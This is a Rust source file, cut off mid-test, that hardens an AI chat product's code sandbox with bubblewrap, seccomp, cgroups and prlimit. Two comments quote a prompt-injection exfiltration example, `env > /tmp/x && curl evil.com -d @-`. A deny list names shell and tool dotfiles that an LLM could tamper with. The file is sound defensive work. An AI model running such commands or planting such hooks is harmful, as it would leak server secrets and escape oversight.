//! bwrap invocation + always-on hardening for the code sandbox.
//!
//! Design rationale and validated flag set for the bwrap + always-on
//! hardening. Every flag here has a test row in the empirical-
//! validation table.

// Linux-only execution primitives — gated so the crate compiles on
// macOS/Windows (where execution goes through the VM / WSL2 backend).
#[cfg(target_os = "linux")]
use std::os::fd::{AsRawFd, IntoRawFd, RawFd};
#[cfg(target_os = "linux")]
use std::os::unix::process::CommandExt;
use std::path::{Path, PathBuf};
#[cfg(target_os = "linux")]
use std::process::Stdio;
use std::sync::Arc;
#[cfg(target_os = "linux")]
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncReadExt};
#[cfg(target_os = "linux")]
use tokio::process::Command;
#[cfg(target_os = "linux")]
use tokio::time::timeout;
use uuid::Uuid;

use crate::common::AppError;
use crate::modules::code_sandbox::types::{
    CgroupMode, CodeSandboxState, HardeningCapabilities, PidNsMode, SandboxContext, SeccompMode,
};

/// Output of a single bwrap invocation. stdout/stderr are each
/// capped at [`OUTPUT_CAP_BYTES`]; bytes past the cap are drained
/// from the pipe and discarded (a truncation marker is appended to
/// the captured output, and `*_truncated: true` is set on the
/// returned JSON). The child is NOT killed when the cap is reached —
/// it can keep running and producing output until natural exit or the
/// wall-clock [`DEFAULT_TIMEOUT_SECS`] expires, at which point a
/// SIGKILL is sent. This keeps a noisy-but-correct workload from
/// being aborted just because it logged a lot, while still bounding
/// total CPU via the timeout.
#[derive(Debug, Clone)]
pub struct SandboxRunResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
    pub duration_ms: u64,
    pub timed_out: bool,
}

/// Per-call output cap. Matches the plan's 1 MiB ceiling. Lifted to
/// a const so tests can assert behavior at the boundary without
/// re-encoding the magic number.
pub const OUTPUT_CAP_BYTES: usize = 1024 * 1024;

/// Default wall-clock timeout for `execute_command`. Other tool callers
/// pass a shorter timeout via `run_in_sandbox`.
pub const DEFAULT_TIMEOUT_SECS: u64 = 600;

/// Run a shell command inside a bwrap-isolated environment.
///
/// All flags are derived from `state.caps` (probed once at boot). The
/// per-call work here is:
///   1. Render argv (no probes; reads cached caps).
///   2. Optionally allocate a transient cgroup scope under
///      `caps.cgroup`'s delegated parent.
///   3. Optionally pipe the compiled seccomp filter bytes to a fd.
///   4. Spawn bwrap → wrap with tokio `timeout` → capture-with-cap.
///   5. Tear down cgroup scope on the way out.
#[cfg(target_os = "linux")]
#[tracing::instrument(
    name = "code_sandbox.exec",
    skip_all,
    fields(
        conversation_id = %ctx.conversation_id,
        user_id = %ctx.user_id,
        command_preview = preview(command, 80),
    ),
)]
pub async fn run_in_sandbox(
    state: &CodeSandboxState,
    ctx: &SandboxContext,
    command: &str,
    timeout_secs: Option<u64>,
    flavor: &str,
) -> Result<SandboxRunResult, AppError> {
    use crate::modules::code_sandbox::{cgroup, runtime_mount};

    // Lazy-mount the rootfs for this FLAVOR (squashfuse) + run
    // rootfs-dependent probes (pid_ns, schema). First call per flavor
    // pays ~200-300 ms; subsequent calls for the same flavor return
    // the cached HardeningCapabilities instantly. Per-flavor mounts
    // coexist — minimal and full both stay live once first used.
    let ensure = runtime_mount::ensure_rootfs_ready(state, flavor).await?;
    let caps = ensure.caps.clone();
    let rootfs_dir = ensure.mount_dir;

    // Runtime-configurable resource caps (Plan 1 §6). Async fetch from the
    // singleton; first call after process start loads from DB, every later
    // call hits the in-process RwLock. Snapshot is an Arc so we drop the
    // lock before doing any work.
    let limits =
        crate::modules::code_sandbox::resource_limits_cache::get().await?;

    let workspace = ctx.workspace.clone();
    // Identity files live OUTSIDE the per-conversation workspace bind
    // (under `<workspace_root>/identity/`) so the sandboxed shell
    // cannot tamper with them via the workspace RW mount.
    let synthetic = SyntheticIdentity::ensure(&state.workspace_root)?;

    // Touch the per-conversation last-used sentinel so the workspace
    // reaper doesn't delete an active long-lived workspace. Without
    // this sentinel, the reaper only sees the directory mtime, which
    // does not update on file writes inside — a 30-day-old
    // conversation that's still in use would get reaped mid-flight.
    let _ = std::fs::write(
        workspace.join(".last_used"),
        chrono::Utc::now().timestamp().to_string(),
    );

    // Per-call cgroup scope, if available.
    let cgroup_scope = match &caps.cgroup {
        CgroupMode::Delegated(parent) => {
            Some(
                cgroup::CgroupScope::create(parent, ctx.conversation_id, &limits)
                    .map_err(|e| {
                        tracing::warn!(
                            "cgroup scope creation failed: {e}; continuing without cgroup"
                        );
                        e
                    })
                    .ok(),
            )
            .flatten()
        }
        CgroupMode::None => None,
    };

    // Per-call seccomp pipe.
    let seccomp_pipe = match &caps.seccomp {
        SeccompMode::Loaded(bpf) => Some(SeccompPipe::install(bpf.clone())?),
        SeccompMode::NotLinked | SeccompMode::Disabled => None,
    };

    let argv = build_bwrap_argv(
        &caps,
        &state.workspace_root,
        ctx,
        &rootfs_dir,
        command,
        synthetic.passwd_path(),
        synthetic.group_path(),
        seccomp_pipe.as_ref().map(|p| p.target_fd()),
        &limits,
    );

    let started = Instant::now();
    let mut cmd = Command::new(&caps.bwrap_path);
    cmd.args(&argv);
    cmd.stdin(Stdio::null());
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.kill_on_drop(true);

    // Attach the seccomp read-fd at the well-known target (we have to
    // dup2 in pre_exec because tokio::process::Command closes non-stdio
    // fds by default).
    if let Some(pipe) = seccomp_pipe.as_ref() {
        let source_fd = pipe.read_fd();
        let target_fd = pipe.target_fd();
        // SAFETY: dup2 is async-signal-safe; we don't allocate or hold
        // locks. The source fd is owned by SeccompPipe and remains
        // valid through cmd.spawn().
        unsafe {
            cmd.pre_exec(move || {
                if libc::dup2(source_fd, target_fd as RawFd) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                // Clear FD_CLOEXEC so the fd survives execve into bwrap.
                let flags = libc::fcntl(target_fd as RawFd, libc::F_GETFD);
                if flags < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                if libc::fcntl(target_fd as RawFd, libc::F_SETFD, flags & !libc::FD_CLOEXEC) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    // NOTE: we deliberately do NOT layer Landlock here. Applying a Landlock
    // ruleset to the bwrap process (it would persist across execve into the
    // workload) is keyed to the *inodes* of the host paths used to build it;
    // bwrap then creates a fresh tmpfs root + `--tmpfs /tmp` + `--dev /dev` +
    // `--proc /proc` whose inodes are under no granted hierarchy, so Landlock
    // would deny the workload's access to /tmp, /dev/null and / and break
    // essentially every command. The only workable Landlock would be an
    // in-rootfs helper applied AFTER bwrap's mounts — but that's a rootfs-
    // release change and is redundant with the mount namespace (the workload
    // already only sees the sandbox mounts; mount/remount syscalls are seccomp-
    // blocked). Filesystem confinement here is bwrap's mount-ns, not Landlock.

    let mut child = cmd
        .spawn()
        .map_err(|e| AppError::new(
            axum::http::StatusCode::INTERNAL_SERVER_ERROR,
            "BWRAP_SPAWN_FAILED",
            format!("failed to spawn bwrap: {e}"),
        ))?;

    // Attach the bwrap pid to the cgroup scope. (L2) This is post-spawn, so in
    // principle there's a window before the workload is in the cgroup — but in
    // practice bwrap's own setup (mount-ns construction, pivot, --proc/--dev)
    // runs before it execs prlimit→bash→workload, and that latency far exceeds
    // this attach, so the workload is in the cgroup before it starts. prlimit
    // (applied to the workload itself, not bwrap) is the always-on backstop
    // regardless. Not worth eliminating with unsafe pre_exec self-attach.
    if let Some(scope) = cgroup_scope.as_ref() {
        if let Some(pid) = child.id() {
            if let Err(e) = scope.attach_pid(pid) {
                tracing::warn!("cgroup attach_pid({pid}) failed: {e}");
            }
        }
    }

    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");

    let stdout_handle = tokio::spawn(read_capped_owned(stdout));
    let stderr_handle = tokio::spawn(read_capped_owned(stderr));

    // Hard wall-clock timeout. timeout=0 keeps the configured default.
    let budget = Duration::from_secs(
        timeout_secs.unwrap_or(limits.timeout_secs.max(1) as u64),
    );
    let wait_result = timeout(budget, child.wait()).await;

    let (timed_out, status) = match wait_result {
        Ok(Ok(s)) => (false, s.code().unwrap_or(-1)),
        Ok(Err(e)) => {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "BWRAP_WAIT_FAILED",
                format!("wait on bwrap child failed: {e}"),
            ));
        }
        Err(_) => {
            // Timed out → SIGKILL. child.kill() is best-effort; even if
            // the bwrap parent is already dead the kernel will reap.
            let _ = child.start_kill();
            let _ = child.wait().await;
            (true, -1)
        }
    };

    // Drain capture tasks.
    let (stdout_buf, stdout_truncated) = stdout_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));
    let (stderr_buf, stderr_truncated) = stderr_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));

    let duration_ms = started.elapsed().as_millis() as u64;

    // Best-effort cgroup cleanup happens via Drop.
    drop(cgroup_scope);
    drop(seccomp_pipe);

    tracing::info!(
        exit_code = status,
        stdout_bytes = stdout_buf.len(),
        stderr_bytes = stderr_buf.len(),
        timed_out,
        duration_ms,
        "code_sandbox.exec complete",
    );

    Ok(SandboxRunResult {
        exit_code: status,
        stdout: lossy_string_with_marker(stdout_buf, stdout_truncated),
        stderr: lossy_string_with_marker(stderr_buf, stderr_truncated),
        stdout_truncated,
        stderr_truncated,
        duration_ms,
        timed_out,
    })
}

// --------------------------------------------------------------------
// argv construction
// --------------------------------------------------------------------

/// Exposed at crate level (via `lib.rs`) so the Tier-4 harness can
/// use the EXACT same argv the production code path uses. Without
/// this exposure the test harness had to maintain a parallel argv
/// builder that drifted from production (caught by Tier 6 in commit
/// 5823061 — the `--as-pid-1` gating bug).
pub(crate) fn build_bwrap_argv(
    caps: &HardeningCapabilities,
    // Root under which conversation attachments are staged. The Linux backend
    // passes the host workspace root; the macOS/Windows VM backends pass the
    // *guest* mount (so attachment binds resolve to guest paths) — this is the
    // only thing the argv builder needed from the old `state` param.
    workspace_root: &Path,
    ctx: &SandboxContext,
    rootfs_dir: &Path,
    user_cmd: &str,
    passwd_path: &Path,
    group_path: &Path,
    // Raw fd number bwrap reads the seccomp filter from. Plain `i32` (not
    // `RawFd`) so this argv builder stays OS-independent and shared across
    // backends; only the Linux backend actually wires up the fd.
    seccomp_fd: Option<i32>,
    // Runtime-configurable resource caps (Plan 1 §6). Drives the prlimit
    // literals at the bottom; cgroup-side caps (memory.max / pids.max /
    // cpu.max) are applied by the cgroup module (Linux host) or by the
    // guest agent reading `ExecRequest.cgroup` (macOS / WSL2). The caller
    // resolves this via `resource_limits_cache::snapshot_or_defaults()`.
    limits: &crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits,
) -> Vec<String> {
    let rootfs = rootfs_dir.to_str().unwrap_or_default();
    let workspace = ctx.workspace.to_string_lossy().to_string();

    let mut argv: Vec<String> = vec![
        // SECURITY: wipe the entire inherited environment before any
        // --setenv lines below. Without --clearenv, the server's full
        // env (DATABASE_URL, JWT secrets, every *_API_KEY,
        // HUGGINGFACE_API_KEY, AWS_*, OPENAI_*, ANTHROPIC_*, etc.) is
        // visible to the sandboxed bash. Combined with --share-net, a
        // prompt-injection like `env > /tmp/x && curl evil.com -d @-`
        // exfiltrates every secret the server holds. With --clearenv,
        // only the explicit --setenv values below survive into the
        // sandbox.
        "--clearenv".into(),
        "--unshare-user".into(),
        "--uid".into(),
        "1001".into(),
        "--gid".into(),
        "1001".into(),
        "--unshare-uts".into(),
        "--unshare-ipc".into(),
        "--unshare-cgroup-try".into(),
        "--share-net".into(),
        "--new-session".into(),
        "--die-with-parent".into(),
        // NOTE: --as-pid-1 is appended ONLY in PID-ns strict mode below,
        // because bwrap refuses `--as-pid-1` without `--unshare-pid`.
        // In DevBindFallback mode the user code runs at whatever PID
        // bwrap assigns (not PID 1) — acceptable, since PID 1 inside
        // the sandbox doesn't change the security boundary.
        // Filesystem (rootfs bind + symlinks for /bin /sbin /lib /lib64).
        "--ro-bind".into(),
        format!("{rootfs}/usr"),
        "/usr".into(),
        "--ro-bind".into(),
        "/etc/ssl".into(),
        "/etc/ssl".into(),
        "--ro-bind".into(),
        passwd_path.display().to_string(),
        "/etc/passwd".into(),
        "--ro-bind".into(),
        group_path.display().to_string(),
        "/etc/group".into(),
        "--symlink".into(),
        "usr/bin".into(),
        "/bin".into(),
        "--symlink".into(),
        "usr/sbin".into(),
        "/sbin".into(),
        "--symlink".into(),
        "usr/lib".into(),
        "/lib".into(),
        "--symlink".into(),
        "usr/lib64".into(),
        "/lib64".into(),
        "--dev".into(),
        "/dev".into(),
        "--tmpfs".into(),
        "/tmp".into(),
        "--bind".into(),
        workspace,
        "/home/sandboxuser".into(),
        "--chdir".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "HOME".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "USER".into(),
        "sandboxuser".into(),
        "--setenv".into(),
        "PATH".into(),
        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
        // Safe defaults that some rootfs tools (R, matplotlib, click)
        // require to start cleanly. Chosen to leak nothing about the
        // host: C.UTF-8 is universal, "dumb" disables interactive
        // terminal behaviors in tools that probe TERM.
        "--setenv".into(),
        "LANG".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "LC_ALL".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "TERM".into(),
        "dumb".into(),
    ];

    // Mandatory deny: mask shell/runtime config dotfiles at the workspace root
    // so an LLM-driven command can neither read them nor create/overwrite them
    // to plant a hook for the host shell or other tools (Anthropic
    // sandbox-runtime pattern; see DANGEROUS_DOTFILES doc). MUST come after the
    // workspace --bind (above) so the masks layer on top of it; per bwrap
    // semantics later binds override earlier ones. `--ro-bind /dev/null <path>`
    // works whether <path> exists or not — bwrap creates it as a regular file
    // pointing at /dev/null on the way in, so reads see empty + writes fail.
    for dotfile in DANGEROUS_DOTFILES {
        argv.push("--ro-bind".into());
        argv.push("/dev/null".into());
        argv.push(format!("/home/sandboxuser/{dotfile}"));
    }

    // PID namespace + /proc handling per cached mode.
    // bwrap rejects `--as-pid-1` unless `--unshare-pid` is also set —
    // so the pid-1 alias is gated on Strict mode here.
    match caps.pid_namespace {
        PidNsMode::Strict => {
            argv.push("--unshare-pid".into());
            argv.push("--as-pid-1".into());
            argv.push("--proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::DevBindFallback => {
            // No --unshare-pid (and therefore no --as-pid-1); bind host
            // /proc. Sandbox sees host PIDs (info leak; no escape).
            // Acceptable for docker hosts where nested proc-mount fails.
            argv.push("--dev-bind".into());
            argv.push("/proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::Disabled => {
            // Reachable only by tests that force-set this; production
            // run_in_sandbox short-circuits before reaching here.
        }
    }

    // Mask dangerous /proc files (runc/Docker do the same). Later binds
    // overlay whatever /proc the PID-ns branch set up. CRITICAL in
    // DevBindFallback mode, where the host's real /proc is bound: without
    // these, `/proc/sysrq-trigger` can panic the host and `/proc/kcore` /
    // `/proc/kallsyms` leak kernel memory + defeat KASLR. Defense-in-depth
    // in Strict mode too. These four files exist on every Linux kernel, so
    // a plain `--ro-bind` (not `-try`) is safe.
    for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
        argv.push("--ro-bind".into());
        argv.push("/dev/null".into());
        argv.push(masked.into());
    }

    // Read-only binds for each conversation attachment at its original
    // filename. Foreign-attachment guard happens upstream in tools.
    for f in ctx.files.iter() {
        // Skip filenames containing path separators — we already store
        // a basename, but defense-in-depth.
        if f.filename.contains('/') || f.filename.contains('\0') {
            continue;
        }
        let host_path = workspace_attachment_path(workspace_root, f.file_id);
        argv.push("--ro-bind-try".into());
        argv.push(host_path.display().to_string());
        argv.push(format!("/home/sandboxuser/{}", f.filename));
    }

    // Optional seccomp filter on a well-known fd we'll dup2 to.
    if let Some(fd) = seccomp_fd {
        argv.push("--seccomp".into());
        argv.push(fd.to_string());
    }

    // CVE-2024-32462 argument-injection defense: terminator BEFORE the
    // sub-command. Every user-controlled arg after this is data only.
    argv.push("--".into());

    // Wrap user code in `prlimit` so per-call rlimits apply to the
    // workload, not to bwrap's own helper forks (validated: setting rlimits
    // on bwrap itself starves bwrap). Values are runtime-configurable via
    // the `code_sandbox_settings` singleton (Plan 1 §6); the caller resolves
    // the snapshot via `resource_limits_cache`.
    argv.push("/usr/bin/prlimit".into());
    argv.push(format!("--nproc={}", limits.nproc_max));
    argv.push(format!("--as={}", limits.address_space_bytes));
    argv.push(format!("--fsize={}", limits.fsize_bytes));
    argv.push(format!("--nofile={}", limits.nofile_max));
    argv.push("--core=0".into());
    // CPU-seconds backstop (G4). Largely redundant — the wall-clock SIGKILL
    // and cgroup cpu.max already bound runaway CPU — but cheap. Defaults
    // generous (2× the default wall-clock budget) so it never preempts a
    // legitimate long command before the wall-clock timeout does. We
    // deliberately do NOT set --stack: a low RLIMIT_STACK breaks legitimate
    // deep-recursion R.
    argv.push(format!("--cpu={}", limits.cpu_secs_max));
    argv.push("--".into());
    argv.push("/bin/bash".into());
    argv.push("-lc".into());
    argv.push(user_cmd.to_string());

    argv
}

/// Per-file workspace path for a conversation attachment.
/// Files are staged under `<workspace_root>/attachments/<file_id>` by
/// the handler before bwrap fires, so the bind is read-only-safe.
pub fn workspace_attachment_path(workspace_root: &Path, file_id: Uuid) -> PathBuf {
    workspace_root.join("attachments").join(file_id.to_string())
}

// --------------------------------------------------------------------
// Synthetic passwd / group (per-call, lives inside the workspace,
// bind-mounted read-only over /etc/passwd /etc/group)
// --------------------------------------------------------------------

struct SyntheticIdentity {
    passwd: PathBuf,
    group: PathBuf,
}

// pub(crate) so the WSL2 backend can provision identical synthetic identity
// files inside the imported distro (the macOS guest root bakes them in).
pub(crate) const SYNTHETIC_PASSWD: &str =
    "sandboxuser:x:1001:1001:Sandbox User:/home/sandboxuser:/bin/bash\n";
pub(crate) const SYNTHETIC_GROUP: &str = "sandboxuser:x:1001:\n";

/// Shell / runtime config files at the workspace root that an LLM-driven sandbox
/// command must NOT be able to read or write. Mirrors Anthropic sandbox-runtime's
/// `DANGEROUS_FILES` list (`src/sandbox/sandbox-utils.ts:11-22`). Each one is
/// either a shell-startup file (`.bashrc`, `.zshrc`, `.profile`, …) that the
/// host shell could source on next login, or a tool-config file (`.gitconfig`,
/// `.mcp.json`, …) that the LLM could subvert to alter outside-sandbox behavior
/// (e.g. credential helpers, MCP server URLs). Masking with `--ro-bind /dev/null`
/// makes every read appear empty AND every write fail with EROFS, regardless of
/// whether the file already exists in the workspace.
const DANGEROUS_DOTFILES: &[&str] = &[
    ".gitconfig",
    ".gitmodules",
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".profile",
    ".ripgreprc",
    ".mcp.json",
];

impl SyntheticIdentity {
    /// Lazily ensure the synthetic passwd/group files exist under
    /// `<workspace_root>/identity/` and return their paths.
    ///
    /// SECURITY: identity files live OUTSIDE the per-conversation
    /// workspace bind. The earlier implementation wrote them into
    /// `<workspace>/.sandbox_passwd`, which had two problems:
    ///   1. Two concurrent calls in the same conversation raced on the
    ///      write (mitigated by the per-conv mutex, but still fragile).
    ///   2. A user who did `write_file(".sandbox_passwd", payload)`
    ///      would have their data silently clobbered by the next
    ///      execute_command — surprising and a small data-loss vector.
    /// Moving the files to `<workspace_root>/identity/` makes them
    /// per-process (shared by every conversation) and the content is
    /// constant, so the write is idempotent: we only write if the
    /// file doesn't already exist or has the wrong content.
    fn ensure(workspace_root: &Path) -> Result<Self, AppError> {
        let identity_dir = workspace_root.join("identity");
        std::fs::create_dir_all(&identity_dir).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_INIT_FAILED",
                format!("mkdir identity dir: {e}"),
            )
        })?;
        let passwd = identity_dir.join("passwd");
        let group = identity_dir.join("group");
        write_if_changed(&passwd, SYNTHETIC_PASSWD).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic passwd: {e}"),
            )
        })?;
        write_if_changed(&group, SYNTHETIC_GROUP).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic group: {e}"),
            )
        })?;
        Ok(Self { passwd, group })
    }

    fn passwd_path(&self) -> &Path {
        &self.passwd
    }
    fn group_path(&self) -> &Path {
        &self.group
    }
}

/// Write `content` to `path` only if the file doesn't already exist
/// or has different content. Avoids redundant disk writes on every
/// sandbox call.
fn write_if_changed(path: &Path, content: &str) -> std::io::Result<()> {
    match std::fs::read_to_string(path) {
        Ok(existing) if existing == content => Ok(()),
        _ => std::fs::write(path, content),
    }
}

// --------------------------------------------------------------------
// Seccomp pipe (per-call). Bytes are precompiled at boot; we just
// shuttle them to a fd that bwrap reads via `--seccomp <fd>`.
// --------------------------------------------------------------------

#[cfg(target_os = "linux")]
struct SeccompPipe {
    read_fd: RawFd,
    /// Stable fd number we dup2 the read end to inside the bwrap child
    /// in pre_exec. We pick fd 7 (out of stdio range, plausibly free).
    target_fd: i32,
}

#[cfg(target_os = "linux")]
impl SeccompPipe {
    fn install(bpf: Arc<Vec<u8>>) -> Result<Self, AppError> {
        // pipe(2) via libc — nix would be cleaner but we avoid the dep
        // here to keep the surface small.
        let mut fds: [libc::c_int; 2] = [0; 2];
        let ret = unsafe { libc::pipe2(fds.as_mut_ptr(), libc::O_CLOEXEC) };
        if ret < 0 {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "SECCOMP_PIPE_FAILED",
                format!("pipe2: {}", std::io::Error::last_os_error()),
            ));
        }
        let read_fd = fds[0];
        let write_fd = fds[1];

        // Push the BPF bytes from a tokio task so we don't deadlock if
        // they're bigger than the kernel pipe buffer (unlikely at <1KB
        // but cheap insurance).
        //
        // SECURITY: write must succeed in full. A short write (or
        // EINTR-interrupted partial write) would feed bwrap a
        // truncated BPF program, which libseccomp rejects → bwrap
        // exits non-zero. Worse: an undetected partial write at the
        // boundary could conceivably load a smaller filter that
        // blocks fewer syscalls than the planner intended. Loop on
        // EINTR / EAGAIN; on any other error or unexpected EOF
        // (write returned 0), log loudly so operators see the
        // hardening claim was not delivered for that call.
        let total = bpf.as_ref().len();
        tokio::spawn(async move {
            let bytes: &[u8] = bpf.as_ref();
            let mut offset = 0;
            let mut last_err: Option<i32> = None;
            while offset < bytes.len() {
                let n = unsafe {
                    libc::write(
                        write_fd,
                        bytes[offset..].as_ptr() as *const libc::c_void,
                        bytes.len() - offset,
                    )
                };
                if n > 0 {
                    offset += n as usize;
                    continue;
                }
                // n <= 0: either error or kernel said "no more room",
                // which on a pipe write means the reader closed —
                // unexpected for our use case.
                let errno = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
                if n < 0 && (errno == libc::EINTR || errno == libc::EAGAIN) {
                    continue;
                }
                last_err = Some(errno);
                break;
            }
            unsafe {
                libc::close(write_fd);
            }
            if offset < total {
                tracing::error!(
                    written = offset,
                    expected = total,
                    errno = ?last_err,
                    "code_sandbox: seccomp BPF write was truncated; \
                     bwrap will reject the filter and the sandboxed \
                     call WILL FAIL — hardening claim 'seccomp: on' \
                     was not delivered for this call"
                );
            }
        });

        Ok(Self {
            read_fd,
            target_fd: 7,
        })
    }

    fn read_fd(&self) -> RawFd {
        self.read_fd
    }
    fn target_fd(&self) -> i32 {
        self.target_fd
    }
}

#[cfg(target_os = "linux")]
impl Drop for SeccompPipe {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.read_fd);
        }
    }
}

// --------------------------------------------------------------------
// Capped stdout/stderr capture.
// --------------------------------------------------------------------

async fn read_capped_owned<R: AsyncRead + Unpin + Send + 'static>(
    mut reader: R,
) -> (Vec<u8>, bool) {
    let mut buf = Vec::with_capacity(8 * 1024);
    let mut chunk = [0u8; 8 * 1024];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => {
                if buf.len() + n > OUTPUT_CAP_BYTES {
                    let remain = OUTPUT_CAP_BYTES - buf.len();
                    buf.extend_from_slice(&chunk[..remain]);
                    truncated = true;
                    // Drain the rest so the writer doesn't block forever.
                    while reader.read(&mut chunk).await.unwrap_or(0) > 0 {}
                    break;
                }
                buf.extend_from_slice(&chunk[..n]);
            }
            Err(_) => break,
        }
    }
    (buf, truncated)
}

fn lossy_string_with_marker(buf: Vec<u8>, truncated: bool) -> String {
    let mut s = String::from_utf8_lossy(&buf).into_owned();
    if truncated {
        s.push_str(&format!(
            "\n[output truncated at {} bytes]\n",
            OUTPUT_CAP_BYTES
        ));
    }
    s
}

fn preview(s: &str, n: usize) -> &str {
    let end = s.char_indices().nth(n).map(|(i, _)| i).unwrap_or(s.len());
    &s[..end]
}

// Re-export so non-sandbox callers don't need to touch RawFd directly.
#[cfg(target_os = "linux")]
pub use std::os::fd::FromRawFd;

// Trait imports used above but otherwise unused locally — keep the
// imports honest in -Dwarnings builds.
#[cfg(target_os = "linux")]
#[allow(dead_code)]
fn _force_fd_imports(f: std::fs::File) -> RawFd {
    let fd = f.as_raw_fd();
    let _: std::fs::File = unsafe { std::fs::File::from_raw_fd(fd) };
    let _moved = unsafe { std::fs::File::from_raw_fd(fd) }.into_raw_fd();
    _moved
}

// =====================================================================
// Tier 1 unit tests — argv builder + output cap
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::config::CodeSandboxConfig;
    use crate::modules::code_sandbox::models::ConversationFile;
    use std::path::PathBuf;
    use std::sync::Arc;
    use uuid::Uuid;

    fn fake_caps() -> HardeningCapabilities {
        HardeningCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            pid_namespace: PidNsMode::Strict,
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    fn fake_host_caps() -> crate::modules::code_sandbox::types::HostCapabilities {
        crate::modules::code_sandbox::types::HostCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    fn fake_state() -> CodeSandboxState {
        CodeSandboxState {
            config: CodeSandboxConfig {
                enabled: true,
                rootfs_path: "/opt/ziee-sandbox-rootfs/current".to_string(),
                cgroup_parent: String::new(),
                ..Default::default()
            },
            loopback_url: "http://127.0.0.1:8080/api/code-sandbox".to_string(),
            workspace_root: PathBuf::from("/tmp/ziee-workspace"),
            host_caps: fake_host_caps(),
        }
    }

    fn fake_ctx() -> SandboxContext {
        SandboxContext {
            conversation_id: Uuid::nil(),
            user_id: Uuid::nil(),
            workspace: PathBuf::from("/tmp/ws"),
            files: Arc::new(Vec::<ConversationFile>::new()),
        }
    }

    /// SQL-default-matching `CodeSandboxResourceLimits` for Tier-1 argv tests.
    /// Mirrors the migration-41 defaults so the prlimit assertions assert the
    /// same numbers the production server starts with on a fresh install.
    fn fake_limits() -> crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits {
        use crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits;
        let now = chrono::Utc::now();
        CodeSandboxResourceLimits {
            memory_max_bytes: 512 * 1024 * 1024,
            memory_swap_max_bytes: 0,
            pids_max: 256,
            cpu_max: "100000 100000".to_string(),
            address_space_bytes: 4 * 1024 * 1024 * 1024,
            fsize_bytes: 256 * 1024 * 1024,
            nproc_max: 256,
            nofile_max: 1024,
            cpu_secs_max: 1240,
            timeout_secs: 620,
            vm_idle_evict_secs: 900,
            mac_vm_vcpus: 2,
            mac_vm_ram_mib: 2048,
            vm_max_concurrent_execs: 3,
            created_at: now,
            updated_at: now,
        }
    }

    #[test]
    fn argv_clears_env_before_setenv() {
        // SECURITY regression test: --clearenv MUST appear before any
        // --setenv flag, so the server's full inherited environment
        // (DATABASE_URL, JWT secrets, every *_API_KEY) does not leak
        // into the sandboxed shell. Combined with --share-net, a
        // missing --clearenv would let a prompt-injected `env >
        // /tmp/x && curl evil.com -d @-` exfiltrate every secret the
        // server holds.
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );

        let clearenv = argv
            .iter()
            .position(|a| a == "--clearenv")
            .expect("bwrap argv must include --clearenv");
        let first_setenv = argv
            .iter()
            .position(|a| a == "--setenv")
            .expect("expected at least one --setenv (HOME/USER/PATH)");

        assert!(
            clearenv < first_setenv,
            "--clearenv must come BEFORE the first --setenv; argv: {argv:?}"
        );

        // Sanity: the safe locale/TERM defaults we added alongside
        // --clearenv are present so rootfs tools (R, matplotlib,
        // click) still start cleanly.
        for required in &["HOME", "USER", "PATH", "LANG", "LC_ALL", "TERM"] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing --setenv for {required}; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_always_terminates_user_input_with_dashdash() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "echo hello",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );
        // There should be at least one `--` before the prlimit wrapper.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not in argv");
        let dashdash_before = argv[..prlimit_idx]
            .iter()
